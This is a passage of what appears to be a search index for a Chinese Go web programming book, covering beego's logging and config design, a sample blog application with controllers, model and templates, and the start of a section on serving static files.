},{"location":"13.4/#beego","title":"beego\u7684\u65e5\u5fd7\u8bbe\u8ba1","text":"<p>beego\u7684\u65e5\u5fd7\u8bbe\u8ba1\u90e8\u7f72\u601d\u8def\u6765\u81ea\u4e8eseelog\uff0c\u6839\u636e\u4e0d\u540c\u7684level\u6765\u8bb0\u5f55\u65e5\u5fd7\uff0c\u4f46\u662fbeego\u8bbe\u8ba1\u7684\u65e5\u5fd7\u7cfb\u7edf\u6bd4\u8f83\u8f7b\u91cf\u7ea7\uff0c\u91c7\u7528\u4e86\u7cfb\u7edf\u7684log.Logger\u63a5\u53e3\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5230os.Stdout,\u7528\u6237\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u7136\u540e\u901a\u8fc7beego.SetLogger\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u7684\u8f93\u51fa\uff0c\u8be6\u7ec6\u7684\u5b9e\u73b0\u5982\u4e0b\u6240\u793a\uff1a</p> <p><pre><code>// Log levels to control the logging output.\nconst (\nLevelTrace = iota\nLevelDebug\nLevelInfo\nLevelWarning\nLevelError\nLevelCritical\n)\n\n// logLevel controls the global log level used by the logger.\nvar level = LevelTrace\n\n// LogLevel returns the global log level and can be used in\n// own implementations of the logger interface.\nfunc Level() int {\nreturn level\n}\n\n// SetLogLevel sets the global log level used by the simple\n// logger.\nfunc SetLevel(l int) {\nlevel = l\n}\n</code></pre> \u4e0a\u9762\u8fd9\u4e00\u6bb5\u5b9e\u73b0\u4e86\u65e5\u5fd7\u7cfb\u7edf\u7684\u65e5\u5fd7\u5206\u7ea7\uff0c\u9ed8\u8ba4\u7684\u7ea7\u522b\u662fTrace\uff0c\u7528\u6237\u901a\u8fc7SetLevel\u53ef\u4ee5\u8bbe\u7f6e\u4e0d\u540c\u7684\u5206\u7ea7\u3002       <pre><code>// logger references the used application logger.\nvar BeeLogger = log.New(os.Stdout, \"\", log.Ldate|log.Ltime)\n\n// SetLogger sets a new logger.\nfunc SetLogger(l *log.Logger) {\nBeeLogger = l\n}\n\n// Trace logs a message at trace level.\nfunc Trace(v ...interface{}) {\nif level &lt;= LevelTrace {\nBeeLogger.Printf(\"[T] %v\\n\", v)\n}\n}\n\n// Debug logs a message at debug level.\nfunc Debug(v ...interface{}) {\nif level &lt;= LevelDebug {\nBeeLogger.Printf(\"[D] %v\\n\", v)\n}\n}\n\n// Info logs a message at info level.\nfunc Info(v ...interface{}) {\nif level &lt;= LevelInfo {\nBeeLogger.Printf(\"[I] %v\\n\", v)\n}\n}\n\n// Warning logs a message at warning level.\nfunc Warn(v ...interface{}) {\nif level &lt;= LevelWarning {\nBeeLogger.Printf(\"[W] %v\\n\", v)\n}\n}\n\n// Error logs a message at error level.\nfunc Error(v ...interface{}) {\nif level &lt;= LevelError {\nBeeLogger.Printf(\"[E] %v\\n\", v)\n}\n}\n\n// Critical logs a message at critical level.\nfunc Critical(v ...interface{}) {\nif level &lt;= LevelCritical {\nBeeLogger.Printf(\"[C] %v\\n\", v)\n}\n}\n</code></pre> \u4e0a\u9762\u8fd9\u4e00\u6bb5\u4ee3\u7801\u9ed8\u8ba4\u521d\u59cb\u5316\u4e86\u4e00\u4e2aBeeLogger\u5bf9\u8c61\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5230os.Stdout\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7beego.SetLogger\u6765\u8bbe\u7f6e\u5b9e\u73b0\u4e86logger\u7684\u63a5\u53e3\u8f93\u51fa\u3002\u8fd9\u91cc\u9762\u5b9e\u73b0\u4e86\u516d\u4e2a\u51fd\u6570\uff1a</p> <ul> <li>Trace\uff08\u4e00\u822c\u7684\u8bb0\u5f55\u4fe1\u606f\uff0c\u4e3e\u4f8b\u5982\u4e0b\uff1a\uff09<ul> <li>\"Entered parse function validation block\"</li> <li>\"Validation: entered second 'if'\"</li> <li>\"Dictionary 'Dict' is empty. Using default value\"</li> </ul> </li> <li>Debug\uff08\u8c03\u8bd5\u4fe1\u606f\uff0c\u4e3e\u4f8b\u5982\u4e0b\uff1a\uff09<ul> <li>\"Web page requested: http://somesite.com Params='...'\"</li> <li>\"Response generated. Response size: 10000. Sending.\"</li> <li>\"New file received. Type:PNG Size:20000\"</li> </ul> </li> <li>Info\uff08\u6253\u5370\u4fe1\u606f\uff0c\u4e3e\u4f8b\u5982\u4e0b\uff1a\uff09<ul> <li>\"Web server restarted\"</li> <li>\"Hourly statistics: Requested pages: 12345 Errors: 123 ...\"</li> <li>\"Service paused. Waiting for 'resume' call\"</li> </ul> </li> <li>Warn\uff08\u8b66\u544a\u4fe1\u606f\uff0c\u4e3e\u4f8b\u5982\u4e0b\uff1a\uff09<ul> <li>\"Cache corrupted for file='test.file'. Reading from back-end\"</li> <li>\"Database 192.168.0.7/DB not responding. Using backup 192.168.0.8/DB\"</li> <li>\"No response from statistics server. Statistics not sent\"</li> </ul> </li> <li>Error\uff08\u9519\u8bef\u4fe1\u606f\uff0c\u4e3e\u4f8b\u5982\u4e0b\uff1a\uff09<ul> <li>\"Internal error. Cannot process request #12345 Error:....\"</li> <li>\"Cannot perform login: credentials DB not responding\"</li> </ul> </li> <li>Critical\uff08\u81f4\u547d\u9519\u8bef\uff0c\u4e3e\u4f8b\u5982\u4e0b\uff1a\uff09<ul> <li>\"Critical panic received: .... Shutting down\"</li> <li>\"Fatal error: ... App is shutting down to prevent data corruption or loss\"</li> </ul> </li> </ul> <p>\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u51fd\u6570\u91cc\u9762\u90fd\u6709\u5bf9level\u7684\u5224\u65ad\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728\u90e8\u7f72\u7684\u65f6\u5019\u8bbe\u7f6e\u4e86level=LevelWarning\uff0c\u90a3\u4e48Trace\u3001Debug\u3001Info\u8fd9\u4e09\u4e2a\u51fd\u6570\u90fd\u4e0d\u4f1a\u6709\u4efb\u4f55\u7684\u8f93\u51fa\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002</p>"},{"location":"13.4/#beego_1","title":"beego\u7684\u914d\u7f6e\u8bbe\u8ba1","text":"<p>\u914d\u7f6e\u4fe1\u606f\u7684\u89e3\u6790\uff0cbeego\u5b9e\u73b0\u4e86\u4e00\u4e2akey=value\u7684\u914d\u7f6e\u6587\u4ef6\u8bfb\u53d6\uff0c\u7c7b\u4f3cini\u914d\u7f6e\u6587\u4ef6\u7684\u683c\u5f0f\uff0c\u5c31\u662f\u4e00\u4e2a\u6587\u4ef6\u89e3\u6790\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u628a\u89e3\u6790\u7684\u6570\u636e\u4fdd\u5b58\u5230map\u4e2d\uff0c\u6700\u540e\u5728\u8c03\u7528\u7684\u65f6\u5019\u901a\u8fc7\u51e0\u4e2astring\u3001int\u4e4b\u7c7b\u7684\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u76f8\u5e94\u7684\u503c\uff0c\u5177\u4f53\u7684\u5b9e\u73b0\u8bf7\u770b\u4e0b\u9762\uff1a</p> <p>\u9996\u5148\u5b9a\u4e49\u4e86\u4e00\u4e9bini\u914d\u7f6e\u6587\u4ef6\u7684\u4e00\u4e9b\u5168\u5c40\u6027\u5e38\u91cf  \uff1a <pre><code>var (\nbComment = []byte{'#'}\nbEmpty   = []byte{}\nbEqual   = []byte{'='}\nbDQuote  = []byte{'\"'}\n)\n</code></pre> \u5b9a\u4e49\u4e86\u914d\u7f6e\u6587\u4ef6\u7684\u683c\u5f0f\uff1a  <pre><code>// A Config represents the configuration.\ntype Config struct {\nfilename string\ncomment  map[int][]string  // id: []{comment, key...}; id 1 is for main comment.\ndata     map[string]string // key: value\noffset   map[string]int64  // key: offset; for editing.\nsync.RWMutex\n}\n</code></pre> \u5b9a\u4e49\u4e86\u89e3\u6790\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u89e3\u6790\u6587\u4ef6\u7684\u8fc7\u7a0b\u662f\u6253\u5f00\u6587\u4ef6\uff0c\u7136\u540e\u4e00\u884c\u4e00\u884c\u7684\u8bfb\u53d6\uff0c\u89e3\u6790\u6ce8\u91ca\u3001\u7a7a\u884c\u548ckey=value\u6570\u636e\uff1a <pre><code>// ParseFile creates a new Config and parses the file configuration from the\n// named file.\nfunc LoadConfig(name string) (*Config, error) {\nfile, err := os.Open(name)\nif err != nil {\nreturn nil, err\n}\n\ncfg := &amp;Config{\nfile.Name(),\nmake(map[int][]string),\nmake(map[string]string),\nmake(map[string]int64),\nsync.RWMutex{},\n}\ncfg.Lock()\ndefer cfg.Unlock()\ndefer file.Close()\n\nvar comment bytes.Buffer\nbuf := bufio.NewReader(file)\n\nfor nComment, off := 0, int64(1); ; {\nline, _, err := buf.ReadLine()\nif err == io.EOF {\nbreak\n}\nif bytes.Equal(line, bEmpty) {\ncontinue\n}\n\noff += int64(len(line))\n\nif bytes.HasPrefix(line, bComment) {\nline = bytes.TrimLeft(line, \"#\")\nline = bytes.TrimLeftFunc(line, unicode.IsSpace)\ncomment.Write(line)\ncomment.WriteByte('\\n')\ncontinue\n}\nif comment.Len() != 0 {\ncfg.comment[nComment] = []string{comment.String()}\ncomment.Reset()\nnComment++\n}\n\nval := bytes.SplitN(line, bEqual, 2)\nif bytes.HasPrefix(val[1], bDQuote) {\nval[1] = bytes.Trim(val[1], `\"`)\n}\n\nkey := strings.TrimSpace(string(val[0]))\ncfg.comment[nComment-1] = append(cfg.comment[nComment-1], key)\ncfg.data[key] = strings.TrimSpace(string(val[1]))\ncfg.offset[key] = off\n}\nreturn cfg, nil\n}\n</code></pre> \u4e0b\u9762\u5b9e\u73b0\u4e86\u4e00\u4e9b\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u8fd4\u56de\u7684\u503c\u786e\u5b9a\u4e3abool\u3001int\u3001float64\u6216string\uff1a <pre><code>// Bool returns the boolean value for a given key.\nfunc (c *Config) Bool(key string) (bool, error) {\nreturn strconv.ParseBool(c.data[key])\n}\n\n// Int returns the integer value for a given key.\nfunc (c *Config) Int(key string) (int, error) {\nreturn strconv.Atoi(c.data[key])\n}\n\n// Float returns the float value for a given key.\nfunc (c *Config) Float(key string) (float64, error) {\nreturn strconv.ParseFloat(c.data[key], 64)\n}\n\n// String returns the string value for a given key.\nfunc (c *Config) String(key string) string {\nreturn c.data[key]\n}\n</code></pre></p>"},{"location":"13.4/#_2","title":"\u5e94\u7528\u6307\u5357","text":"<p>\u4e0b\u9762\u8fd9\u4e2a\u51fd\u6570\u662f\u6211\u4e00\u4e2a\u5e94\u7528\u4e2d\u7684\u4f8b\u5b50\uff0c\u7528\u6765\u83b7\u53d6\u8fdc\u7a0burl\u5730\u5740\u7684json\u6570\u636e\uff0c\u5b9e\u73b0\u5982\u4e0b\uff1a <pre><code>func GetJson() {\nresp, err := http.Get(beego.AppConfig.String(\"url\"))\nif err != nil {\nbeego.Critical(\"http get info error\")\nreturn\n}\ndefer resp.Body.Close()\nbody, err := ioutil.ReadAll(resp.Body)\nerr = json.Unmarshal(body, &amp;AllInfo)\nif err != nil {\nbeego.Critical(\"error:\", err)\n}\n}\n</code></pre> \u51fd\u6570\u4e2d\u8c03\u7528\u4e86\u6846\u67b6\u7684\u65e5\u5fd7\u51fd\u6570<code>beego.Critical</code>\u51fd\u6570\u7528\u6765\u62a5\u9519\uff0c\u8c03\u7528\u4e86<code>beego.AppConfig.String(\"url\")</code>\u7528\u6765\u83b7\u53d6\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u4fe1\u606f\uff0c\u914d\u7f6e\u6587\u4ef6\u7684\u4fe1\u606f\u5982\u4e0b(app.conf)\uff1a <pre><code>appname = hs\nurl =\"http://www.api.com/api.html\"\n</code></pre></p>"},{"location":"13.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: controller\u8bbe\u8ba1</li> <li>\u4e0b\u4e00\u8282: \u5b9e\u73b0\u535a\u5ba2\u7684\u589e\u5220\u6539</li> </ul>"},{"location":"13.5/","title":"13.5 \u5b9e\u73b0\u535a\u5ba2\u7684\u589e\u5220\u6539","text":""},{"location":"13.5/#135","title":"13.5 \u5b9e\u73b0\u535a\u5ba2\u7684\u589e\u5220\u6539","text":"<p>\u524d\u9762\u4ecb\u7ecd\u4e86beego\u6846\u67b6\u5b9e\u73b0\u7684\u6574\u4f53\u6784\u601d\u4ee5\u53ca\u90e8\u5206\u5b9e\u73b0\u7684\u4f2a\u4ee3\u7801\uff0c\u8fd9\u5c0f\u8282\u4ecb\u7ecd\u901a\u8fc7beego\u5efa\u7acb\u4e00\u4e2a\u535a\u5ba2\u7cfb\u7edf\uff0c\u5305\u62ec\u535a\u5ba2\u6d4f\u89c8\u3001\u6dfb\u52a0\u3001\u4fee\u6539\u3001\u5220\u9664\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"13.5/#_1","title":"\u535a\u5ba2\u76ee\u5f55","text":"<p>\u535a\u5ba2\u76ee\u5f55\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>.\n\u251c\u2500\u2500 controllers\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 delete.go\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 edit.go\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 index.go\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 new.go\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 view.go\n\u251c\u2500\u2500 main.go\n\u251c\u2500\u2500 models\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 model.go\n\u2514\u2500\u2500 views\n    \u251c\u2500\u2500 edit.tpl\n    \u251c\u2500\u2500 index.tpl\n    \u251c\u2500\u2500 layout.tpl\n    \u251c\u2500\u2500 new.tpl\n    \u2514\u2500\u2500 view.tpl\n</code></pre>"},{"location":"13.5/#_2","title":"\u535a\u5ba2\u8def\u7531","text":"<p>\u535a\u5ba2\u4e3b\u8981\u7684\u8def\u7531\u89c4\u5219\u5982\u4e0b\u6240\u793a\uff1a <pre><code>//\u663e\u793a\u535a\u5ba2\u9996\u9875\nbeego.Router(\"/\", &amp;controllers.IndexController{})\n//\u67e5\u770b\u535a\u5ba2\u8be6\u7ec6\u4fe1\u606f\nbeego.Router(\"/view/:id([0-9]+)\", &amp;controllers.ViewController{})\n//\u65b0\u5efa\u535a\u5ba2\u535a\u6587\nbeego.Router(\"/new\", &amp;controllers.NewController{})\n//\u5220\u9664\u535a\u6587\nbeego.Router(\"/delete/:id([0-9]+)\", &amp;controllers.DeleteController{})\n//\u7f16\u8f91\u535a\u6587\nbeego.Router(\"/edit/:id([0-9]+)\", &amp;controllers.EditController{})\n</code></pre></p>"},{"location":"13.5/#_3","title":"\u6570\u636e\u5e93\u7ed3\u6784","text":"<p>\u6570\u636e\u5e93\u8bbe\u8ba1\u6700\u7b80\u5355\u7684\u535a\u5ba2\u4fe1\u606f <pre><code>CREATE TABLE entries (\nid INT AUTO_INCREMENT,\ntitle TEXT,\ncontent TEXT,\ncreated DATETIME,\nprimary key (id)\n);\n</code></pre></p>"},{"location":"13.5/#_4","title":"\u63a7\u5236\u5668","text":"<p>IndexController:</p> <p><pre><code>type IndexController struct {\nbeego.Controller\n}\n\nfunc (this *IndexController) Get() {\nthis.Data[\"blogs\"] = models.GetAll()\nthis.Layout = \"layout.tpl\"\nthis.TplName = \"index.tpl\"\n}\n</code></pre> ViewController:</p> <p><pre><code>type ViewController struct {\nbeego.Controller\n}\n\nfunc (this *ViewController) Get() {\nid, _ := strconv.Atoi(this.Ctx.Input.Params()[\":id\"])\nthis.Data[\"Post\"] = models.GetBlog(id)\nthis.Layout = \"layout.tpl\"\nthis.TplName = \"view.tpl\"\n}\n</code></pre> NewController <pre><code>type NewController struct {\nbeego.Controller\n}\n\nfunc (this *NewController) Get() {\nthis.Layout = \"layout.tpl\"\nthis.TplName = \"new.tpl\"\n}\n\nfunc (this *NewController) Post() {\ninputs := this.Input()\nvar blog models.Blog\nblog.Title = inputs.Get(\"title\")\nblog.Content = inputs.Get(\"content\")\nblog.Created = time.Now()\nmodels.SaveBlog(blog)\nthis.Ctx.Redirect(302, \"/\")\n}       </code></pre> EditController <pre><code>type EditController struct {\nbeego.Controller\n}\n\nfunc (this *EditController) Get() {\nid, _ := strconv.Atoi(this.Ctx.Input.Params()[\":id\"])\nthis.Data[\"Post\"] = models.GetBlog(id)\nthis.Layout = \"layout.tpl\"\nthis.TplName = \"edit.tpl\"\n}\n\nfunc (this *EditController) Post() {\ninputs := this.Input()\nvar blog models.Blog\nblog.Id, _ = strconv.Atoi(inputs.Get(\"id\"))\nblog.Title = inputs.Get(\"title\")\nblog.Content = inputs.Get(\"content\")\nblog.Created = time.Now()\nmodels.SaveBlog(blog)\nthis.Ctx.Redirect(302, \"/\")\n}\n</code></pre> DeleteController <pre><code>type DeleteController struct {\nbeego.Controller\n}\n\nfunc (this *DeleteController) Get() {\nid, _ := strconv.Atoi(this.Ctx.Input.Params()[\":id\"])\nblog := models.GetBlog(id)\nthis.Data[\"Post\"] = blog\nmodels.DelBlog(blog)\nthis.Ctx.Redirect(302, \"/\")\n}\n</code></pre></p>"},{"location":"13.5/#model","title":"model\u5c42","text":"<pre><code>package models\n\nimport (\n\"database/sql\"\n\"github.com/astaxie/beedb\"\n_ \"github.com/ziutek/mymysql/godrv\"\n\"time\"\n)\n\ntype Blog struct {\nId      int `PK`\nTitle   string\nContent string\nCreated time.Time\n}\n\nfunc GetLink() beedb.Model {\ndb, err := sql.Open(\"mymysql\", \"blog/astaxie/123456\")\nif err != nil {\npanic(err)\n}\norm := beedb.New(db)\nreturn orm\n}\n\nfunc GetAll() (blogs []Blog) {\ndb := GetLink()\ndb.FindAll(&amp;blogs)\nreturn\n}\n\nfunc GetBlog(id int) (blog Blog) {\ndb := GetLink()\ndb.Where(\"id=?\", id).Find(&amp;blog)\nreturn\n}\n\nfunc SaveBlog(blog Blog) (bg Blog) {\ndb := GetLink()\ndb.Save(&amp;blog)\nreturn bg\n}\n\nfunc DelBlog(blog Blog) {\ndb := GetLink()\ndb.Delete(&amp;blog)\nreturn\n}\n</code></pre>"},{"location":"13.5/#view","title":"view\u5c42","text":"<p>layout.tpl <pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;My Blog&lt;/title&gt;\n    &lt;style&gt;\n#menu {\nwidth: 200px;\nfloat: right;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;ul id=\"menu\"&gt;\n    &lt;li&gt;&lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;/li&gt;\n    &lt;li&gt;&lt;a href=\"/new\"&gt;New Post&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n\n{{.LayoutContent}}\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p> <p>index.tpl <pre><code>&lt;h1&gt;Blog posts&lt;/h1&gt;\n\n&lt;ul&gt;\n{{range .blogs}}\n    &lt;li&gt;\n        &lt;a href=\"/view/{{.Id}}\"&gt;{{.Title}}&lt;/a&gt;\n        from {{.Created}}\n        &lt;a href=\"/edit/{{.Id}}\"&gt;Edit&lt;/a&gt;\n        &lt;a href=\"/delete/{{.Id}}\"&gt;Delete&lt;/a&gt;\n    &lt;/li&gt;\n{{end}}\n&lt;/ul&gt;\n</code></pre> view.tpl <pre><code>&lt;h1&gt;{{.Post.Title}}&lt;/h1&gt;\n{{.Post.Created}}&lt;br/&gt;\n\n{{.Post.Content}}               \n</code></pre> new.tpl <pre><code>&lt;h1&gt;New Blog Post&lt;/h1&gt;\n&lt;form action=\"\" method=\"post\"&gt;\n\u6807\u9898:&lt;input type=\"text\" name=\"title\"&gt;&lt;br&gt;\n\u5185\u5bb9\uff1a&lt;textarea name=\"content\" colspan=\"3\" rowspan=\"10\"&gt;&lt;/textarea&gt;\n&lt;input type=\"submit\"&gt;\n&lt;/form&gt;\n</code></pre> edit.tpl <pre><code>&lt;h1&gt;Edit {{.Post.Title}}&lt;/h1&gt;\n\n&lt;h1&gt;New Blog Post&lt;/h1&gt;\n&lt;form action=\"\" method=\"post\"&gt;\n\u6807\u9898:&lt;input type=\"text\" name=\"title\" value=\"{{.Post.Title}}\"&gt;&lt;br&gt;\n\u5185\u5bb9\uff1a&lt;textarea name=\"content\" colspan=\"3\" rowspan=\"10\"&gt;{{.Post.Content}}&lt;/textarea&gt;\n&lt;input type=\"hidden\" name=\"id\" value=\"{{.Post.Id}}\"&gt;\n&lt;input type=\"submit\"&gt;\n&lt;/form&gt;\n</code></pre></p>"},{"location":"13.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u65e5\u5fd7\u548c\u914d\u7f6e\u8bbe\u8ba1</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"13.6/","title":"13.6 \u5c0f\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u5b9e\u73b0\u4e00\u4e2a\u57fa\u7840\u7684Go\u8bed\u8a00\u6846\u67b6\uff0c\u6846\u67b6\u5305\u542b\u6709\u8def\u7531\u8bbe\u8ba1\uff0c\u7531\u4e8eGo\u5185\u7f6e\u7684http\u5305\u4e2d\u8def\u7531\u7684\u4e00\u4e9b\u4e0d\u8db3\u70b9\uff0c\u6211\u4eec\u8bbe\u8ba1\u4e86\u52a8\u6001\u8def\u7531\u89c4\u5219\uff0c\u7136\u540e\u4ecb\u7ecd\u4e86MVC\u6a21\u5f0f\u4e2d\u7684Controller\u8bbe\u8ba1\uff0ccontroller\u5b9e\u73b0\u4e86REST\u7684\u5b9e\u73b0\uff0c\u8fd9\u4e2a\u4e3b\u8981\u601d\u8def\u6765\u6e90\u4e8etornado\u6846\u67b6\uff0c\u7136\u540e\u8bbe\u8ba1\u5b9e\u73b0\u4e86\u6a21\u677f\u7684layout\u4ee5\u53ca\u81ea\u52a8\u5316\u6e32\u67d3\u7b49\u6280\u672f\uff0c\u4e3b\u8981\u91c7\u7528\u4e86Go\u5185\u7f6e\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u6700\u540e\u6211\u4eec\u4ecb\u7ecd\u4e86\u4e00\u4e9b\u8f85\u52a9\u7684\u65e5\u5fd7\u3001\u914d\u7f6e\u7b49\u4fe1\u606f\u7684\u8bbe\u8ba1\uff0c\u901a\u8fc7\u8fd9\u4e9b\u8bbe\u8ba1\u6211\u4eec\u5b9e\u73b0\u4e86\u4e00\u4e2a\u57fa\u7840\u7684\u6846\u67b6beego\uff0c\u76ee\u524d\u8be5\u6846\u67b6\u5df2\u7ecf\u5f00\u6e90\u5728GitHub\uff0c\u6700\u540e\u6211\u4eec\u901a\u8fc7beego\u5b9e\u73b0\u4e86\u4e00\u4e2a\u535a\u5ba2\u7cfb\u7edf\uff0c\u901a\u8fc7\u5b9e\u4f8b\u4ee3\u7801\u8be6\u7ec6\u7684\u5c55\u73b0\u4e86\u5982\u4f55\u5feb\u901f\u7684\u5f00\u53d1\u4e00\u4e2a\u7ad9\u70b9\u3002</p>"},{"location":"13.6/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u5b9e\u73b0\u535a\u5ba2\u7684\u589e\u5220\u6539</li> <li>\u4e0b\u4e00\u8282: \u6269\u5c55Web\u6846\u67b6</li> </ul>"},{"location":"14.0/","title":"14 \u6269\u5c55Web\u6846\u67b6","text":"<p>\u7b2c\u5341\u4e09\u7ae0\u4ecb\u7ecd\u4e86\u5982\u4f55\u5f00\u53d1\u4e00\u4e2aWeb\u6846\u67b6\uff0c\u901a\u8fc7\u4ecb\u7ecdMVC\u3001\u8def\u7531\u3001\u65e5\u5fd7\u5904\u7406\u3001\u914d\u7f6e\u5904\u7406\u5b8c\u6210\u4e86\u4e00\u4e2a\u57fa\u672c\u7684\u6846\u67b6\u7cfb\u7edf\uff0c\u4f46\u662f\u4e00\u4e2a\u597d\u7684\u6846\u67b6\u9700\u8981\u4e00\u4e9b\u65b9\u4fbf\u7684\u8f85\u52a9\u5de5\u5177\u6765\u5feb\u901f\u7684\u5f00\u53d1Web\uff0c\u90a3\u4e48\u6211\u4eec\u8fd9\u4e00\u7ae0\u5c06\u5c31\u5982\u4f55\u63d0\u4f9b\u4e00\u4e9b\u5feb\u901f\u5f00\u53d1Web\u7684\u5de5\u5177\u8fdb\u884c\u4ecb\u7ecd\uff0c\u7b2c\u4e00\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u5904\u7406\u9759\u6001\u6587\u4ef6\uff0c\u5982\u4f55\u5229\u7528\u73b0\u6709\u7684twitter\u5f00\u6e90\u7684bootstrap\u8fdb\u884c\u5feb\u901f\u7684\u5f00\u53d1\u7f8e\u89c2\u7684\u7ad9\u70b9\uff0c\u7b2c\u4e8c\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u5229\u7528\u524d\u9762\u4ecb\u7ecd\u7684session\u6765\u8fdb\u884c\u7528\u6237\u767b\u5f55\u5904\u7406\uff0c\u7b2c\u4e09\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u65b9\u4fbf\u7684\u8f93\u51fa\u8868\u5355\u3001\u8fd9\u4e9b\u8868\u5355\u5982\u4f55\u8fdb\u884c\u6570\u636e\u9a8c\u8bc1\uff0c\u5982\u4f55\u5feb\u901f\u7684\u7ed3\u5408model\u8fdb\u884c\u6570\u636e\u7684\u589e\u5220\u6539\u64cd\u4f5c\uff0c\u7b2c\u56db\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u8fdb\u884c\u4e00\u4e9b\u7528\u6237\u8ba4\u8bc1\uff0c\u5305\u62echttp basic\u8ba4\u8bc1\u3001http digest\u8ba4\u8bc1\uff0c\u7b2c\u4e94\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u5229\u7528\u524d\u9762\u4ecb\u7ecd\u7684i18n\u652f\u6301\u591a\u8bed\u8a00\u7684\u5e94\u7528\u5f00\u53d1\u3002\u7b2c\u516d\u5c0f\u8282\u4ecb\u7ecd\u4e86\u5982\u4f55\u96c6\u6210Go\u7684pprof\u5305\u7528\u4e8e\u6027\u80fd\u8c03\u8bd5\u3002</p> <p>\u901a\u8fc7\u672c\u7ae0\u7684\u6269\u5c55\uff0cbeego\u6846\u67b6\u5c06\u5177\u6709\u5feb\u901f\u5f00\u53d1Web\u7684\u7279\u6027\uff0c\u6700\u540e\u6211\u4eec\u5c06\u8bb2\u89e3\u5982\u4f55\u5229\u7528\u8fd9\u4e9b\u6269\u5c55\u7684\u7279\u6027\u6269\u5c55\u5f00\u53d1\u7b2c\u5341\u4e09\u7ae0\u5f00\u53d1\u7684\u535a\u5ba2\u7cfb\u7edf\uff0c\u901a\u8fc7\u5f00\u53d1\u4e00\u4e2a\u5b8c\u6574\u3001\u7f8e\u89c2\u7684\u535a\u5ba2\u7cfb\u7edf\u8ba9\u8bfb\u8005\u4e86\u89e3beego\u5f00\u53d1\u5e26\u7ed9\u4f60\u7684\u5feb\u901f\u3002</p>"},{"location":"14.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"14.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u5341\u4e09\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: \u9759\u6001\u6587\u4ef6\u652f\u6301</li> </ul>"},{"location":"14.1/","title":"14.1 \u9759\u6001\u6587\u4ef6\u652f\u6301","text":"<p>\u6211\u4eec\u5728\u524d\u9762\u5df2\u7ecf\u8bb2\u8fc7\u5982\u4f55\u5904\u7406\u9759\u6001\u6587\u4ef6\uff0c\u8fd9\u5c0f\u8282\u6211\u4eec\u8be6\u7ec6\u7684\u4ecb\u7ecd\u5982\u4f55\u5728beego\u91cc\u9762\u8bbe\u7f6e\u548c\u4f7f\u7528\u9759\u6001\u6587\u4ef6\u3002\u901a\u8fc7\u518d\u4ecb\u7ecd\u4e00\u4e2atwitter\u5f00\u6e90\u7684html\u3001css\u6846\u67b6bootstrap\uff0c\u65e0\u9700\u5927\u91cf\u7684\u8bbe\u8ba1\u5de5\u4f5c\u5c31\u80fd\u591f\u8ba9\u4f60\u5feb\u901f\u5730\u5efa\u7acb\u4e00\u4e2a\u6f02\u4eae\u7684\u7ad9\u70b9\u3002</p>"},{"location":"14.1/#beego","title":"beego\u9759\u6001\u6587\u4ef6\u5b9e\u73b0\u548c\u8bbe\u7f6e","text":"<p>Go\u7684net/http\u5305\u4e2d\u63d0\u4f9b\u4e86\u9759\u6001\u6587\u4ef6\u7684\u670d\u52a1\uff0c<code>ServeFile</code>\u548c<code>FileServer</code>\u7b49\u51fd\u6570\u3002beego\u7684\u9759\u6001\u6587\u4ef6\u5904\u7406\u5c31\u662f\u57fa\u4e8e\u8fd9\u4e00\u5c42\u5904\u7406\u7684\uff0c\u5177\u4f53\u7684\u5b9e\u73b0\u5982\u4e0b\u6240\u793a\uff1a <pre><code>//static file server\nfor prefix, staticDir := range StaticDir {\nif strings.HasPrefix(r.URL.Path, prefix) {\nfile := staticDir + r.URL.Path[len(prefix):]\nhttp.ServeFile(w, r, file)\nw.started = true\nreturn\n}\n}\n</code></pre> 